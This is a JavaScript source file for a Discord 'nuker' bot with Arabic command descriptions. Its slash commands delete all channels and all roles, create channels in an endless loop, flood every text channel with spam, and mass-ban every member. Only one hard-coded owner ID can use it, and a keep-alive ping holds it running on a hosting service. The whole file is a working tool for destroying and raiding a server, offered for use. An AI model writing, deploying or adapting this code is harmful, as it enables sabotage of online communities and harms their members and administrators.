const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, ChannelType, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const OWNER_ID = '1452136095788564614';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
    ]
});

const activeOperations = new Map();

const commands = [
    new SlashCommandBuilder()
        .setName('delete-rooms')
        .setDescription('حذف جميع الروومات في السيرفر')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('add-room')
        .setDescription('إضافة روومات بشكل مستمر مع زر إيقاف')
        .addStringOption(option =>
            option.setName('name')
                .setDescription('اسم الروم')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('count')
                .setDescription('عدد الروومات (اتركه فارغ للسبام المستمر)')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('spam')
        .setDescription('إرسال رسالة وصورة في جميع الروومات مع زر إيقاف')
        .addStringOption(option =>
            option.setName('message')
                .setDescription('النص المراد إرساله')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('image')
                .setDescription('رابط الصورة')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('باند عضو من السيرفر')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('العضو المراد بانه')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('days')
                .setDescription('عدد أيام حذف الرسائل (0-7)')
                .setMinValue(0)
                .setMaxValue(7)
                .setRequired(false))
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الباند')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),

    new SlashCommandBuilder()
        .setName('mass-ban')
        .setDescription('باند جميع الأعضاء في السيرفر')
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الباند (اختياري)')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('delete-roles')
        .setDescription('حذف جميع الرولات في السيرفر')
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الحذف (اختياري)')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

async function registerCommands(guildId) {
    try {
        console.log('جاري تسجيل الأوامر...');
        await rest.put(
            Routes.applicationGuildCommands(CLIENT_ID, guildId),
            { body: commands }
        );
        console.log('تم تسجيل الأوامر بنجاح!');
    } catch (error) {
        console.error('خطأ في تسجيل الأوامر:', error);
    }
}

client.once('ready', async () => {
    console.log(`✅ البوت شغال: ${client.user.tag}`);
    for (const guild of client.guilds.cache.values()) {
        await registerCommands(guild.id);
    }
});

client.on('interactionCreate', async (interaction) => {

    if (interaction.isButton()) {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: '❌ ليس لديك صلاحية.', flags: 64 });
        }
        const opId = interaction.customId.replace('stop_', '');
        if (activeOperations.has(opId)) {
            activeOperations.set(opId, false);
            await interaction.update({ content: '🛑 تم إيقاف العملية!', components: [] });
        }
        return;
    }

    if (!interaction.isChatInputCommand()) return;

    if (interaction.user.id !== OWNER_ID) {
        return interaction.reply({ content: '❌ هذا البوت خاص ولا يمكنك استخدامه.', flags: 64 });
    }

    const { commandName } = interaction;

    // ===== حذف جميع الروومات =====
    if (commandName === 'delete-rooms') {
        await interaction.deferReply({ flags: 64 });
        const channels = interaction.guild.channels.cache;
        let deleted = 0;
        for (const channel of channels.values()) {
            try { await channel.delete(); deleted++; } catch (e) {}
        }
        await interaction.editReply(`✅ تم حذف **${deleted}** روم بنجاح.`);
    }

    // ===== إضافة روومات =====
    else if (commandName === 'add-room') {
        const name = interaction.options.getString('name');
        const count = interaction.options.getInteger('count');
        const opId = `addroom_${interaction.id}`;
        activeOperations.set(opId, true);

        const stopButton = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`stop_${opId}`)
                .setLabel('🛑 إيقاف')
                .setStyle(ButtonStyle.Danger)
        );

        await interaction.reply({ content: `⚙️ جاري إنشاء الروومات...`, components: [stopButton], flags: 64 });

        let created = 0;
        const limit = count || Infinity;
        while (activeOperations.get(opId) && created < limit) {
            try {
                await interaction.guild.channels.create({ name, type: ChannelType.GuildText });
                created++;
            } catch (e) { break; }
            await new Promise(r => setTimeout(r, 300));
        }
        activeOperations.delete(opId);
        try { await interaction.editReply({ content: `✅ تم إنشاء **${created}** روم.`, components: [] }); } catch (e) {}
    }

    // ===== سبام في جميع الروومات =====
    else if (commandName === 'spam') {
        const message = interaction.options.getString('message');
        const imageUrl = interaction.options.getString('image');

        if (!message && !imageUrl) {
            return interaction.reply({ content: '❌ لازم تحط نص أو صورة!', flags: 64 });
        }

        const opId = `spam_${interaction.id}`;
        activeOperations.set(opId, true);

        const stopButton = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`stop_${opId}`)
                .setLabel('🛑 إيقاف')
                .setStyle(ButtonStyle.Danger)
        );

        await interaction.reply({ content: `⚙️ جاري إرسال الرسائل في جميع الروومات...`, components: [stopButton], flags: 64 });

        let sent = 0;
        while (activeOperations.get(opId)) {
            const channels = interaction.guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
            for (const channel of channels.values()) {
                if (!activeOperations.get(opId)) break;
                try {
                    const msgOptions = {};
                    if (message) msgOptions.content = message;
                    if (imageUrl) msgOptions.embeds = [{ image: { url: imageUrl } }];
                    await channel.send(msgOptions);
                    sent++;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
        }
        activeOperations.delete(opId);
        try { await interaction.editReply({ content: `✅ تم إرسال **${sent}** رسالة.`, components: [] }); } catch (e) {}
    }

    // ===== باند =====
    else if (commandName === 'ban') {
        await interaction.deferReply({ flags: 64 });
        const user = interaction.options.getUser('user');
        const days = interaction.options.getInteger('days') ?? 0;
        const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
        try {
            await interaction.guild.members.ban(user, { deleteMessageDays: days, reason });
            await interaction.editReply(`✅ تم باند **${user.tag}** | السبب: ${reason} | حذف رسائل: ${days} يوم`);
        } catch (e) { await interaction.editReply(`❌ فشل الباند: ${e.message}`); }
    }

 // ===== باند جماعي سريع =====
else if (commandName === 'mass-ban') {
    await interaction.deferReply({ flags: 64 });
    const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
    try {
        const members = await interaction.guild.members.fetch();
        let banned = 0;
        let batch = [];
        
        for (const member of members.values()) {
            if (member.id === interaction.user.id) continue;
            if (member.id === client.user.id) continue;
            batch.push(member);
            
            if (batch.length === 15) {
                for (const m of batch) {
                    try { await m.ban({ reason }); banned++; } catch (e) {}
                }
                batch = [];
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        
        for (const m of batch) {
            try { await m.ban({ reason }); banned++; } catch (e) {}
        }
        
        await interaction.editReply(`✅ تم باند **${banned}** عضو | السبب: ${reason}`);
    } catch (e) { await interaction.editReply(`❌ فشل الباند الجماعي: ${e.message}`); }
}
    // ===== حذف جميع الرولات =====
    else if (commandName === 'delete-roles') {
        await interaction.deferReply({ flags: 64 });
        const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
        const roles = interaction.guild.roles.cache.filter(r => r.name !== '@everyone');
        let deleted = 0;
        for (const role of roles.values()) {
            try { await role.delete(reason); deleted++; } catch (e) {}
        }
        await interaction.editReply(`✅ تم حذف **${deleted}** رول | السبب: ${reason}`);
    }
});

// ===== سيرفر HTTP لـ Render =====
http.createServer((req, res) => res.end('Bot is running!')).listen(process.env.PORT || 3000);

// ===== Keep Alive =====
setInterval(() => {
    fetch('https://bot-dragon.onrender.com').catch(() => {});
}, 4 * 60 * 1000);

client.login(TOKEN);
